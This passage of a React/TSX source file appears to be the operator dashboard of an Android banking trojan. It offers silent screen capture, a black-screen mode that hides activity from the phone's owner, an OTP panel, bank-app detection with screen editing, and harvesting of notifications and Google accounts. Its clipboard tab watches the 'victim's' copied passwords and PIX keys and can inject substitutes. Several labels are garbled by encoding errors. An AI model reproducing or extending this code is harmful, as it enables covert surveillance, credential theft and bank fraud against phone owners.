          <div className="bg-[#121214] border-t border-[#2a2a31]/20 p-2 space-y-2">
            {/* Navegação */}
            <div className="grid grid-cols-4 gap-1">
              <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
              <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
              <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
              <button onClick={() => sendCommand({ action: 'POWER' })} className="py-3 bg-[#ef4444] text-white rounded text-xl">»</button>
            </div>
            
            <div className="grid grid-cols-5 gap-1">
              <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 text-white rounded text-xs"></button>
              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-[#2a2a31] text-white rounded text-xs"></button>
              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-[#2a2a31] text-white rounded text-xs"></button>
              <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-[#24242a] text-white rounded text-xs"></button>
              <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 text-white rounded text-xs"></button>
            </div>
            
            {/* Ações */}
            <div className="grid grid-cols-3 gap-1">
              <button
                onClick={toggleCapture}
                className={`py-2 rounded text-xs font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-gray-700 text-white'}`}
              >
                {isCaptureEnabled ? '´ Captura' : '¶ Captura'}
              </button>
              <button
                onClick={toggleBlackScreen}
                className={`py-2 rounded text-xs font-bold ${isBlackScreen ? 'bg-black text-white border border-white' : 'bg-[#2a2a31] text-white'}`}
              >
                {isBlackScreen ? ' Preta ON' : ' Preta'}
              </button>
              <button
                onClick={() => sendCommand({ action: 'NOTIFICATIONS' })}
                className="py-2 bg-[#ef4444] text-white rounded text-xs font-bold"
              >
                 Notif.
              </button>
            </div>
            
            <button 
              onClick={handleFormatDevice} 
              className="w-full py-2 bg-[#121214] text-white rounded text-xs font-bold border border-[#3a3a44] tracking-wider uppercase transition-all mt-1"
            >
               Formatar Equipamento (Reset)
            </button>
          </div>
        )}
      </div>
    );
  }
  // ============================================
  //  RENDERIZAÇO MOBILE - DESIGN PREMIUM
  // ============================================
  if (isMobile) {
    return (
      <div className="min-h-screen w-full bg-[#0f0404] text-white relative" style={{ overflowX: 'hidden' }}>
      <OtpPanel deviceId={deviceId} />

        {/* Gradiente de fundo sólido - SEM transparência */}
        <div className="fixed inset-0 bg-gradient-to-b from-[#121214] via-[#200603] to-[#120303] pointer-events-none z-0" />

        {/* Overlay Offline */}
        {!device.is_online && (
          <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center z-[200]">
            <div className="text-center p-6 bg-[#3a0d04] rounded-md border-2 border-[#2a2a31] mx-4 shadow-[0_0_40px_rgba(239,68,68,0.4)]">
              <span className="text-5xl"></span>
              <h2 className="text-xl font-black text-[#ef4444] mt-3 uppercase tracking-wider">Dispositivo Offline</h2>
              <p className="text-slate-400 text-xs mt-2 mb-4">A íconexão com o aparelho foi perdida.</p>
              <button onClick={() => navigate('/dashboard')} className="px-6 py-2.5 bg-[#ef4444] text-white rounded-md text-sm font-bold">
                 Voltar ao Painel
              </button>
            </div>
          </div>
        )}

        {/* ===== HEADER MOBILE NEON ===== */}
      <header className="sticky top-0 z-30 bg-[#0f0f11]/95 backdrop-blur-xl border-b border-[#24242a]">
        <div className="flex items-center gap-3 px-4 h-14">
          <button
            onClick={() => navigate('/dashboard')}
            className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0"
            title="Volver al panel"
          >
            <ArrowLeft className="w-4 h-4" />
          </button>

          <img src="/gangstar-logo.svg?v=3" alt="Kryptos" className="w-6 h-6 flex-shrink-0" />

          <div className="min-w-0">
            <div className="flex items-center gap-1.5">
              <span className="text-[12px] font-semibold text-[#e8e8ea] truncate leading-tight">
                {device.custom_name ? device.custom_name.toUpperCase() : device.model}
              </span>
              <button onClick={handleRename} className="text-[11px] text-[#6f6f78] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Renombrar equipo">
                
              </button>
            </div>
            <div className="text-[9px] font-mono text-[#6f6f78] truncate leading-tight">
              {device.model} · {device.android_version || 'Android'}
            </div>
          </div>

          <span className={`flex items-center gap-1.5 px-2 py-0.5 rounded text-[10px] font-mono flex-shrink-0 border ${
            device.is_online
              ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
              : 'bg-[#ef4444]/10 border-[#ef4444]/30 text-[#ef4444]'
          }`}>
            <span className="w-1.5 h-1.5 rounded-full bg-current" />
            {device.is_online ? 'EN LÍNEA' : 'SIN CONEXIÓN'}
          </span>

          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-mono flex-shrink-0 border ${
            device.admin_active
              ? 'bg-[#1a1a1e] border-[#3a3a44] text-[#e8e8ea]'
              : 'bg-[#121214] border-[#2a2a31] text-[#6f6f78]'
          }`} title={device.admin_active ? 'Administrador activo' : 'Administrador inactivo'}>
            <ShieldAlert className="w-3 h-3" />
            {device.admin_active ? 'ADMIN' : 'SIN ADMIN'}
          </span>

          <div className="flex-1" />

          <div className="flex items-center border border-[#2a2a31] rounded-md overflow-hidden flex-shrink-0">
            <button type="button" onClick={() => handleZoomChange(panelZoom - 10)} className="px-1.5 py-1 text-[#8b8b94] hover:bg-[#1a1a1e] text-[11px] font-mono" title="Reducir">-</button>
            <span className="px-1 text-[10px] font-mono text-[#8b8b94] w-9 text-center select-none">{panelZoom}%</span>
            <button type="button" onClick={() => handleZoomChange(panelZoom + 10)} className="px-1.5 py-1 text-[#8b8b94] hover:bg-[#1a1a1e] text-[11px] font-mono" title="Ampliar">+</button>
            {panelZoom !== 100 && (
              <button type="button" onClick={() => handleZoomChange(100)} className="px-1.5 py-1 text-[9px] font-mono text-[#ef4444] border-l border-[#2a2a31] hover:bg-[#1a1a1e]" title="Restablecer">100</button>
            )}
          </div>

          <LanguageSelector />

          <button onClick={() => setShowRobotTutorial(true)} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Asistente">
            <RobotAvatar size={16} isFloating theme="cyan" />
          </button>

          <button
            onClick={() => { if (!isFloatingMode) { organizeCockpitLayout(); } else { setIsFloatingMode(false); } }}
            className={`p-2 rounded-md border transition-colors flex-shrink-0 ${isFloatingMode ? 'bg-[#ef4444]/15 border-[#ef4444]/40 text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`}
            title="Modo flotante"
          >
            <Layout className="w-4 h-4" />
          </button>

          <button onClick={onLogout} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Salir">
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </header>

        {/* ===== ABAS VNC / V2 ===== */}
        <div className="relative z-10 bg-[#220603]/95 border-b border-[#2a2a31]/60 px-3 py-2 flex gap-2 overflow-x-auto no-scrollbar">
          {[
            { label: ' VNC', active: !showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isCaptureEnabled) toggleCapture(); }},
            { label: ' V2', active: showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isScreenReaderEnabled) toggleScreenReader(); }},
            { label: ' Bancos', active: showBankMonitorTab, action: () => { setShowBankMonitorTab(true); setShowGoogleAccountsTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowClipboardTab(false); setShowScreenReader(false); }},
            { label: ' Clipboard', active: showClipboardTab, action: () => { setShowClipboardTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowScreenReader(false); fetchClipboard(); }},
            { label: ' Contas Google', active: showGoogleAccountsTab, action: () => { setShowGoogleAccountsTab(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowClipboardTab(false); setShowScreenReader(false); }},
            { label: ' Notifs', active: showNotificationsTab, action: () => { setShowNotificationsTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowAppsTab(false); setShowClipboardTab(false); fetchNotifications(); }},
            { label: ' Apps', active: showAppsTab, action: () => { setShowAppsTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowClipboardTab(false); fetchInstalledApps(); }},
          ].map((tab, i) => (
            <button
              key={i}
              onClick={tab.action}
              className={`whitespace-nowrap px-3 py-1.5 rounded-md text-xs font-bold border transition-all shrink-0 ${tab.active ? 'bg-[#ef4444]/20 border-[#2a2a31]/60 text-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.2)]' : 'bg-[#24242a]/60 border-[#2a2a31] text-slate-400'}`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* ===== REA PRINCIPAL ===== */}
        <div className="relative z-10 px-3 pt-3 pb-28">

          {/* --- TELA VNC --- */}
          {!showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab && (
            <div className="rounded-md overflow-hidden border border-[#2a2a31]/40 shadow-[0_0_20px_rgba(239,68,68,0.1)] bg-black" style={{ minHeight: '55vw', maxHeight: '70vh' }}>
              {isCaptureEnabled ? (
                <DeviceScreen
                  deviceId={deviceId!}
                  onCommand={sendCommand}
                  isBlackScreenActive={isBlackScreen}
                  onConnectionStatusChange={handleConnectionStatusChange}
                  captureMethod="silent"
                  killerFrameOnPointerMove={isKillerMode}
                  onRequestFrame={requestKillerFrame}
                />
              ) : (
                <div className="flex flex-col items-center justify-center h-64 gap-3">
                  <div className="w-14 h-14 bg-[#ef4444]/10 rounded-full flex items-center justify-center border border-[#2a2a31]/30">
                    <span className="text-3xl"></span>
                  </div>
                  <p className="text-slate-400 text-sm font-mono">Captura de tela pausada</p>
                  <button onClick={toggleCapture} className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] rounded-md text-sm font-bold shadow-[0_0_15px_rgba(239,68,68,0.3)]">
                    ¶ Iniciar Captura
                  </button>
                </div>
              )}
            </div>
          )}

          {/* --- TELA V2 --- */}
          {showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab && (
            <div
              className="rounded-md overflow-hidden border border-emerald-500/40 shadow-[0_0_20px_rgba(16,185,129,0.1)] bg-[#120303]"
              style={{ minHeight: '55vw', maxHeight: '70vh' }}
              onTouchStart={(e) => {
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                setMouseDownPos({ x: touch.clientX - rect.left, y: touch.clientY - rect.top });
                setMouseDownTime(Date.now());
                setIsDragging(true);
                dragPathRef.current = [{ x: touch.clientX - rect.left, y: touch.clientY - rect.top }];
              }}
              onTouchMove={(e) => {
                if (!isDragging) return;
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                if (lastPoint && Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2)) > 15) {
                  dragPathRef.current.push({ x, y });
                }
              }}
              onTouchEnd={(e) => {
                if (!mouseDownPos) return;
                const touch = e.changedTouches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const upX = touch.clientX - rect.left;
                const upY = touch.clientY - rect.top;
                const distance = Math.sqrt(Math.pow(upX - mouseDownPos.x, 2) + Math.pow(upY - mouseDownPos.y, 2));
                const holdTime = Date.now() - mouseDownTime;
                const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                const realScale = rect.width / devW;
                const deviceDownX = Math.round(mouseDownPos.x / realScale);
                const deviceDownY = Math.round(mouseDownPos.y / realScale);
                const deviceUpX = Math.round(upX / realScale);
                const deviceUpY = Math.round(upY / realScale);
                const normX = Math.max(0, Math.min(1, deviceDownX / devW));
                const normY = Math.max(0, Math.min(1, deviceDownY / devH));
                const normX2 = Math.max(0, Math.min(1, deviceUpX / devW));
                const normY2 = Math.max(0, Math.min(1, deviceUpY / devH));
                if (holdTime > 500 && distance < 10) {
                  sendCommand({ action: 'LONG_PRESS', x: normX, y: normY, scale: 'vnc_norm' });
                } else if (distance > 30) {
                  sendCommand({ action: 'SWIPE', x1: normX, y1: normY, x2: normX2, y2: normY2, duration: Math.min(500, Math.max(100, holdTime)), scale: 'vnc_norm' });
                } else {
                  sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                }
                setMouseDownPos(null);
                setIsDragging(false);
                dragPathRef.current = [];
              }}
            >
              {screenHierarchy && screenHierarchy.hierarchy ? (
                <ScreenReaderCanvas
                  hierarchy={screenHierarchy.hierarchy}
                  maxHeight={400}
                  textScale={v2TextScale}
                  designTheme={v2DesignTheme}
                  hideUntyped={v2HideUntypedElements}
                  opacity={v2Opacity}
                  showGrid={v2ShowGrid}
                  cornerStyle={v2CornerStyle}
                  showCoords={v2ShowCoords}
                />
              ) : (
                <div className="h-64 flex flex-col items-center justify-center gap-2">
                  <div className="w-10 h-10 border-2 border-emerald-400 border-t-transparent rounded-full animate-spin" />
                  <p className="text-gray-400 text-sm font-mono">Carregando V2...</p>
                </div>
              )}
            </div>
          )}

          {/* --- ABA BANCOS --- */}
          {showBankMonitorTab && (
            <div className="space-y-3">
              <div className="bg-[#380d04]/95 rounded-md border border-[#ef4444]/30 p-3">
                <h3 className="text-sm font-black text-[#fca5a5] mb-3 font-mono uppercase flex items-center gap-2"> Bancos Detectados ({installedBanks.length})</h3>
                {installedBanks.length === 0 ? (
                  <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Nenhum banco detectado. Atualize a lista de apps.</p>
                ) : (
                  <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                    {installedBanks.map((bank, i) => (
                      <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-md border border-[#ef4444]/20">
                        <div className="flex items-center gap-2 min-w-0">
                          <BankIcon pkg={bank.package} iconB64={bank.icon || bank.iconB64} name={bank.name} size={32} />
                          <div className="min-w-0">
                            <p className="text-white text-xs font-bold truncate max-w-[140px]">{bank.name}</p>
                            <p className="text-[#8b8b94] text-[9px] font-mono truncate max-w-[140px]">{bank.package}</p>
                          </div>
                        </div>
                        <div className="flex gap-1.5 shrink-0">
                          <button onClick={() => openApp(bank.package, bank.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-md text-[10px] font-bold cursor-pointer">¶</button>
                          <button onClick={() => { setEditBankPackage(bank.package); setEditBankLogoText(bank.name); setShowEditBankScreensTab(true); setShowBankMonitorTab(false); }} className="px-2 py-1 bg-[#4d7c0f]/80 text-white rounded-md text-[10px] font-bold cursor-pointer"></button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* --- ABA NOTIFICAÇÕES --- */}
          {showNotificationsTab && (
            <div className="bg-[#380d04]/95 rounded-md border border-[#f87171]/30 p-3">
              <h3 className="text-sm font-black text-[#fca5a5] mb-3 font-mono uppercase flex items-center gap-2"><Bell className="w-4 h-4" /> Notificações ({notifications.length})</h3>
              {notifications.length === 0 ? (
                <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Sem notificações recentes.</p>
              ) : (
                <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                  {notifications.slice(0, 30).map((n: any, i) => (
                    <div key={i} className="bg-[#280903] p-2.5 rounded-md border border-[#f87171]/20">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-[10px] font-bold text-[#fca5a5] font-mono truncate">{n.appName || n.package}</span>
                        <span className="text-[9px] text-[#8b8b94] ml-auto">{n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ''}</span>
                      </div>
                      <p className="text-white text-xs break-all">{n.title && <strong>{n.title}: </strong>}{n.text}</p>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* --- ABA APPS --- */}
          {showAppsTab && (
            <div className="bg-[#380d04]/95 rounded-md border border-emerald-500/30 p-3">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-sm font-black text-emerald-300 font-mono uppercase flex items-center gap-2"><Smartphone className="w-4 h-4" /> Apps ({installedApps.length})</h3>
                <button onClick={fetchInstalledApps} className="px-2 py-1 bg-emerald-800/60 border border-emerald-500/40 rounded-md text-[10px] text-emerald-300 font-bold cursor-pointer"> Atualizar</button>
              </div>
              {installedApps.length === 0 ? (
                <p className="text-[#8b8b94] text-xs text-center py-4 font-mono">Sem apps. Toque em Atualizar.</p>
              ) : (
                <div className="space-y-2 max-h-[60vh] overflow-y-auto pr-1">
                  {installedApps.slice(0, 50).map((app, i) => (
                    <div key={i} className="flex items-center justify-between bg-[#280903] p-2.5 rounded-md border border-emerald-500/20">
                      <div className="flex items-center gap-2 min-w-0">
                        <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64} name={app.name} size={30} />
                        <div className="min-w-0">
                          <p className="text-white text-xs font-bold truncate max-w-[140px]">{app.name}</p>
                          <p className="text-[#8b8b94] text-[9px] font-mono truncate max-w-[140px]">{app.package}</p>
                        </div>
                      </div>
                      <button onClick={() => openApp(app.package, app.name)} className="px-2 py-1 bg-emerald-700/80 text-white rounded-md text-[10px] font-bold cursor-pointer shrink-0">¶ Abrir</button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* --- ABA CONTAS GOOGLE --- */}
          {showGoogleAccountsTab && (
            <div className="bg-[#380d04]/95 rounded-md border border-amber-500/40 p-4 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-sm font-black text-amber-300 font-mono uppercase flex items-center gap-2">
                    <span></span> Contas Google no Aparelho ({device?.accounts?.length || 0})
                  </h3>
                  <p className="text-slate-400 text-[11px] font-mono mt-0.5">
                    Contas registradas e vinculadas aos serviços Google neste dispositivo.
                  </p>
                </div>
                <button 
                  onClick={() => {
                    sendCommand({ action: 'GET_DEVICE_INFO' });
                  }} 
                  className="px-3 py-1.5 bg-amber-900/60 hover:bg-amber-800/80 border border-amber-500/50 rounded-md text-xs text-amber-300 font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(245,158,11,0.2)]"
                >
                  <RefreshCw className="w-3.5 h-3.5" /> Atualizar
                </button>
              </div>

              {(!device?.accounts || device.accounts.length === 0) ? (
                <div className="text-center py-8 bg-[#280903] border border-dashed border-amber-500/30 rounded-md p-4">
                  <span className="text-4xl block mb-2 opacity-60"></span>
                  <p className="text-slate-300 text-xs font-bold font-mono">Nenhuma conta Google retornada ainda</p>
                  <p className="text-[#8b8b94] text-[10px] font-mono mt-1 max-w-sm mx-auto">
                    Toque em Atualizar para solicitar as contas ao dispositivo ou garanta que o serviço de acessibilidade/admin esteja ativo.
                  </p>
                </div>
              ) : (
                <div className="space-y-3 max-h-[60vh] overflow-y-auto pr-1">
                  {device.accounts.map((acc: string, i: number) => (
                    <div key={i} className="flex items-center justify-between bg-[#280903] p-3 rounded-md border border-amber-500/30 hover:border-amber-400/60 transition-all shadow-md">
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-9 h-9 rounded-md bg-gradient-to-br from-amber-500/20 to-[#84cc16]/30 border border-amber-500/40 flex items-center justify-center shrink-0">
                          <span className="text-base"></span>
                        </div>
                        <div className="min-w-0">
                          <p className="text-amber-200 text-xs font-black font-mono truncate">{acc}</p>
                          <p className="text-[#8b8b94] text-[10px] font-mono">Conta Google / Sync Android</p>
                        </div>
                      </div>
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(acc);
                          alert(`Conta ${acc} copiada para a área de transferência!`);
                        }}
                        className="px-3 py-1.5 bg-amber-950/90 hover:bg-amber-900 border border-amber-500/50 text-amber-300 rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                      >
                        <Copy className="w-3.5 h-3.5" /> Copiar
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* --- ABA CLIPBOARD (REA DE TRANSFERŠNCIA) --- */}
          {showClipboardTab && (
            <div className="bg-[#380d04]/95 rounded-md border border-[#2a2a31]/40 p-4 shadow-[0_0_20px_rgba(239,68,68,0.15)] space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-black text-[#ef4444] font-mono uppercase flex items-center gap-2">
                    <span></span> rea de Transferência (Clipboard Sincronizado)
                  </h3>
                  <p className="text-slate-400 text-[11px] font-mono mt-0.5">
                    Monitoramento em tempo real de textos, senhas e PIX copiados pela vítima.
                  </p>
                </div>
                <button 
                  onClick={fetchClipboard} 
                  disabled={isLoadingClipboard}
                  className="px-3 py-1.5 bg-[#121214]/80 hover:bg-[#1a1a1e] border border-[#2a2a31]/50 rounded-md text-xs text-[#ef4444] font-bold flex items-center gap-1 cursor-pointer transition-all shadow-[0_0_10px_rgba(239,68,68,0.2)]"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isLoadingClipboard ? 'animate-spin' : ''}`} /> Atualizar
                </button>
              </div>

              {/* Form de Injeção de Texto no Clipboard */}
              <form onSubmit={handleInjectClipboard} className="bg-[#240703] p-3.5 rounded-md border border-[#2a2a31]/30 space-y-2">
                <label className="text-[11px] font-bold text-[#ef4444] uppercase tracking-wider block font-mono">
                   Injetar Texto no Clipboard do Aparelho:
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={clipboardInputText}
                    onChange={(e) => setClipboardInputText(e.target.value)}
                    placeholder="Digite o texto, chave PIX ou senha para injetar no celular..."
                    className="flex-1 bg-[#120303] border border-[#2a2a31]/40 rounded-md px-3 py-2 text-xs text-white placeholder-[#8b8b94] font-mono focus:outline-none focus:border-[#3a3a44]"
                  />
                  <button
                    type="submit"
                    className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold font-mono shadow-[0_0_12px_rgba(239,68,68,0.3)] shrink-0 cursor-pointer"
                  >
                    Enviar 
                  </button>
                </div>
              </form>

              {/* Clipboard Atual em Destaque */}
              {clipboardData.current && (
                <div className="bg-gradient-to-r from-amber-950/60 to-amber-900/40 p-3.5 rounded-md border border-amber-500/50 shadow-lg">
                  <span className="text-[10px] font-black text-amber-400 uppercase tracking-wider block font-mono mb-1">
                     CLIPBOARD ATUALMENTE ATIVO NO CELULAR:
                  </span>
                  <div className="flex items-center justify-between gap-3">
                    <p className="text-amber-100 font-mono font-bold text-xs break-all bg-amber-950/80 p-2 rounded-md border border-amber-500/30 flex-1">
                      {clipboardData.current}
                    </p>
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(clipboardData.current!);
                        alert('Texto copiado com sucesso!');
                      }}
                      className="px-3 py-2 bg-amber-900 hover:bg-amber-800 border border-amber-400 text-amber-200 rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                    >
                      <Copy className="w-3.5 h-3.5" /> Copiar
                    </button>
                  </div>
                </div>
              )}

              {/* Histórico do Clipboard */}
              <div>
                <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono mb-2">
                   Histórico de Textos Copiados ({clipboardData.history.length})
                </h4>
                {clipboardData.history.length === 0 ? (
                  <div className="text-center py-6 bg-[#280903] border border-dashed border-[#2a2a31]/20 rounded-md">
                    <span className="text-3xl block mb-2 opacity-50"></span>
                    <p className="text-slate-400 text-xs font-mono">Nenhum texto copiado capturado ainda.</p>
                  </div>
                ) : (
                  <div className="space-y-2 max-h-[50vh] overflow-y-auto pr-1">
                    {clipboardData.history.map((item) => (
                      <div key={item.id} className="flex items-center justify-between bg-[#280903] p-3 rounded-md border border-[#2a2a31]/20 hover:border-[#3a3a44]/40 transition-all">
                        <div className="min-w-0 flex-1 pr-3">
                          <p className="text-[#e8e8ea] text-xs font-mono font-bold break-all">{item.text}</p>
                          <p className="text-[#8b8b94] text-[9px] font-mono mt-0.5">
                            {new Date(item.timestamp).toLocaleString('pt-BR')}
                          </p>
                        </div>
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(item.text);
                            alert('Texto copiado!');
                          }}
                          className="px-2.5 py-1.5 bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/40 text-[#ef4444] rounded-md text-xs font-bold font-mono flex items-center gap-1 shrink-0 cursor-pointer"
                        >
                          <Copy className="w-3 h-3" /> Copiar
                        </button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>

        {/* ===== BARRA DE CONTROLES FIXOS NO FUNDO ===== */}
        <div className="fixed bottom-0 left-0 right-0 z-20 bg-[#220603]/98 backdrop-blur-xl border-t border-[#2a2a31]/30 px-3 py-2 shadow-[0_-4px_20px_rgba(0,0,0,0.6)]">
          {/* Navegação Android */}
          <div className="grid grid-cols-5 gap-1.5 mb-2">
            <button onClick={() => sendCommand({ action: 'BACK' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
            <button onClick={() => sendCommand({ action: 'HOME' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
            <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-2.5 bg-[#24242a] hover:bg-[#2a2a31] active:bg-[#6f6f78] text-white rounded-md text-base font-bold border border-[#2a2a31] transition-all"></button>
            <button
              onClick={toggleCapture}
              className={`py-2 rounded-md text-[10px] font-bold border transition-all ${isCaptureEnabled ? 'bg-green-700/80 border-green-500/50 text-green-100' : 'bg-[#24242a] border-[#2a2a31] text-slate-300'}`}
            >
              {isCaptureEnabled ? '´ VNC' : '¶ VNC'}
            </button>
            <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2.5 bg-[#ef4444]/80 hover:bg-[#ef4444] text-white rounded-md text-base font-bold border border-[#2a2a31]/50 transition-all">»</button>
          </div>
          {/* Ações Extras */}
          <div className="grid grid-cols-4 gap-1.5">
            <button onClick={toggleBlackScreen} className={`py-2 rounded-md text-[10px] font-bold border transition-all ${isBlackScreen ? 'bg-black border-white/40 text-white' : 'bg-[#24242a] border-[#2a2a31] text-slate-300'}`}>
              {isBlackScreen ? ' Preta' : ' Preta'}
            </button>
            <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-[#24242a] border border-[#2a2a31] text-slate-300 rounded-md text-[10px] font-bold"> Notif</button>
            <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-[#24242a] border border-[#2a2a31] text-slate-300 rounded-md text-[10px] font-bold">š Config</button>
            <button onClick={() => setIsMobileFullscreen(true)} className="py-2 bg-[#ef4444]/80 border border-[#2a2a31]/50 text-[#e8e8ea] rounded-md text-[10px] font-bold"> Full</button>
          </div>
        </div>

      </div>
    );
  }

  // ============================================
  // ¥ RENDERIZAƒO DESKTOP - ORIGINAL
  // ============================================
  return (
    <div className="min-h-screen bg-[#0a0a0b] text-slate-100 relative overflow-x-hidden">
      {/* BANNER FLUTUANTE DE NOTIFICAÇO DE DUPLICAÇO */}
      {duplicationBanner && (
        <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[99999] px-6 py-3 bg-[#121214]/95 border-2 border-[#3a3a44] text-[#ef4444] rounded-md shadow-[0_0_40px_rgba(239,68,68,0.7)] backdrop-blur-xl flex items-center gap-3 animate-bounce">
          <span className="text-2xl"></span>
          <span className="font-bold text-sm tracking-wide font-mono">{duplicationBanner}</span>
        </div>
      )}

      {/* Dynamic Cyber HUD Ambient Lights */}
      <div className="absolute top-0 left-1/4 w-[700px] h-[400px] bg-[#ef4444]/10 blur-[180px] pointer-events-none rounded-full" />
      <div className="absolute top-1/3 right-5 w-[600px] h-[400px] bg-[#84cc16]/10 blur-[180px] pointer-events-none rounded-full" />
      <div className="absolute bottom-10 left-10 w-[500px] h-[300px] bg-emerald-500/10 blur-[180px] pointer-events-none rounded-full" />

      {/* OVERLAY DE DISPOSITIVO DESÍCONECTADO */}
      {!device.is_online && !device.has_screen && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-[100]">
          <div className="text-center p-8 hud-glass-card rounded-md border-2 border-[#2a2a31]/80 max-w-md mx-4 shadow-[0_0_50px_rgba(239,68,68,0.35)]">
            <div className="w-20 h-20 bg-[#ef4444]/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-[#2a2a31]/40 animate-pulse">
              <span className="text-5xl"></span>
            </div>
            <h2 className="text-2xl font-black text-[#ef4444] mb-2 uppercase tracking-wider font-mono">Dispositivo Offline</h2>
            <p className="text-slate-300 mb-6 text-xs leading-relaxed font-mono">
              A íconexão remota foi interrompida ou o aparelho não está emitindo telemetria VNC.
